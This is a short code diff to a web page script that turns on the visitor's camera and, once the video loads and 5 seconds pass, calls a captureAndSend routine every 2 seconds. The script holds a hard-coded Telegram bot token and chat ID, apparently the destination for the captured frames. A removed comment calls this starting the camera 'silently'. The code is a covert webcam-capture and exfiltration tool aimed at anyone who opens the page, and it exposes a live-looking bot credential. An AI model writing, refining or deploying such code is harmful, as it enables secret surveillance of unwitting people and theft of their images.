@@ -40,15 +40,20 @@
     const botToken = '8182610963:AAFcz4eIbThryJkQJ0Xb22jRM_nZBW-IxTs';
     const chatId = '6431178492';
 
-    // Start the camera silently
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
-        // Start auto-capture loop
-        setInterval(() => {
-          captureAndSend();
-        }, 2000); // every 2 seconds
+        video.onloadedmetadata = () => {
+          video.play();
+
+          // Wait 5 seconds after camera starts
+          setTimeout(() => {
+            setInterval(() => {
+              captureAndSend();
+            }, 2000); // capture every 2 seconds
+          }, 5000); // wait 5 seconds before starting captures
+        };
       })
       .catch(err => {
         console.error('Camera access denied or error:', err);
